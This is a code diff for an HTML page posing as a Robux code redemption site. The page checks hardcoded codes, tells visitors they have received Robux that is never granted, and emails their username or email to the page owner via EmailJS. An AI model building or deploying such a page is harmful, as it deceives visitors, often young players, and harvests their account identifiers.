@@ -1,63 +1,79 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <title>Redeem Robux Code</title>
+  <meta charset="utf-8">
+  <title>Robux Code Redeem</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: sans-serif; max-width: 500px; margin: 2rem auto; padding: 1rem; }
+    input, button { width: 100%; padding: 0.7rem; margin: 0.5rem 0; font-size: 1rem; box-sizing: border-box; }
+    .message { padding: 0.7rem; border-radius: 5px; margin-top: 1rem; }
+    .success { background: #e6ffed; border: 1px solid #2ecc71; }
+    .error { background: #ffe6e6; border: 1px solid #e74c3c; }
+  </style>
 </head>
 <body>
-  <h1>Redeem Robux Code</h1>
+  <h1>Redeem Your Robux Code</h1>
 
-  <input id="user" placeholder="Your name or email (optional)">
-  <input id="code" placeholder="Enter code">
-  <button onclick="redeem()">Redeem</button>
+  <input id="user" placeholder="Your username or email">
+  <input id="code" placeholder="Enter your code">
+  <button onclick="redeemCode()">Redeem</button>
 
   <div id="message"></div>
 
   <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    (function() {
-      emailjs.init("YOUR_PUBLIC_KEY"); // <-- replace with your EmailJS public key
-    })();
+    // Initialize EmailJS
+    emailjs.init("YOUR_PUBLIC_KEY"); // <-- replace with your EmailJS public key
 
-    // Example codes
+    // Hardcoded codes with Robux amounts
     const codes = {
       "FREE100": 100,
       "GIFT50": 50,
-      "BONUS10": 10
+      "BONUS10": 10,
+      "SUPER200": 200,
+      "LUCKY25": 25
     };
 
-    function redeem() {
-      const user = document.getElementById('user').value.trim() || "Anonymous";
-      const code = document.getElementById('code').value.trim().toUpperCase();
+    // Track redeemed codes (browser-side)
+    const redeemedCodes = new Set();
 
-      if (!code) {
-        show("Please enter a code.");
-        return;
-      }
+    function redeemCode() {
+      const user = document.getElementById('user').value.trim();
+      const codeInput = document.getElementById('code').value.trim().toUpperCase();
 
-      if (!codes[code]) {
-        show("Invalid or already used code.");
-        return;
-      }
+      if (!user) { showMessage("Please enter your username/email.", "error"); return; }
+      if (!codeInput) { showMessage("Please enter a code.", "error"); return; }
+      if (!codes[codeInput]) { showMessage("Invalid code.", "error"); return; }
+      if (redeemedCodes.has(codeInput)) { showMessage("This code has already been redeemed.", "error"); return; }
 
-      const amount = codes[code];
-      show(`✅ Code redeemed for ${amount} Robux!`);
+      const amount = codes[codeInput];
+      redeemedCodes.add(codeInput);
 
-      // Send you an email
+      showMessage(`✅ Success! Code redeemed for ${amount} Robux.`, "success");
+
+      // Send email notification
       emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
-        code: code,
-        amount: amount,
-        user: user
+        username: user,
+        code: codeInput,
+        amount: amount
       }).then(() => {
         console.log("Email sent!");
       }, (err) => {
-        console.error("Email failed:", err);
+        console.error("EmailJS error:", err);
       });
     }
 
-    function show(text) {
-      document.getElementById('message').textContent = text;
+    function showMessage(text, type) {
+      const messageEl = document.getElementById('message');
+      messageEl.innerHTML = `<div class="message ${type}">${escapeHtml(text)}</div>`;
+    }
+
+    function escapeHtml(text) {
+      return text.replace(/[&<>"']/g, function(m) {
+        return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[m];
+      });
     }
   </script>
 </body>
